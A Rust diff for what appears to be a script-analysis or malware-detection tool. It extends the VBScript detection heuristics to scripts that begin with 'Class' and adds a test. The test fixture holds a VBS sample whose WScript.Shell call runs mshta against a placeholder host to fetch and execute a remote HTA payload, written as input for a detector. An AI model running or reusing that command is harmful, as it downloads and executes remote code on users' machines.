@@ -2915,6 +2915,8 @@ fn looks_like_vbs_script(lower: &str) -> bool {
         || lower.starts_with("public function ")
         || (lower.contains("\nfunction ") || lower.starts_with("function "))
             && lower.contains("end function")
+        || (lower.contains("\nclass ") || lower.starts_with("class "))
+            && lower.contains("end class")
 }
 
 fn looks_like_js_script(lower: &str) -> bool {
@@ -2954,6 +2956,7 @@ fn starts_like_standalone_vbs(lower: &str) -> bool {
         || first.starts_with("private sub ")
         || first.starts_with("public function ")
         || (first.starts_with("function ") && lower.contains("end function"))
+        || (first.starts_with("class ") && lower.contains("end class"))
 }
 
 fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) -> bool {
@@ -14315,6 +14318,35 @@ Main"#;
         );
         assert!(
             report.deobfuscated.contains("Function Main()\nSet sh"),
+            "standalone VBS source was not preserved in deobfuscated output: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_class_prefix_shell_run_url_extracted() {
+        let vbs = br#"Class Runner
+Public Sub Main()
+Set sh = CreateObject("WScript.Shell")
+sh.Run "mshta http://standalone-vbs-class.example/payload.hta", 0, False
+End Sub
+End Class
+Set r = New Runner
+r.Main"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-class.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS with Class prefix: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("Class Runner\nPublic Sub"),
             "standalone VBS source was not preserved in deobfuscated output: {:?}",
             report.deobfuscated
         );
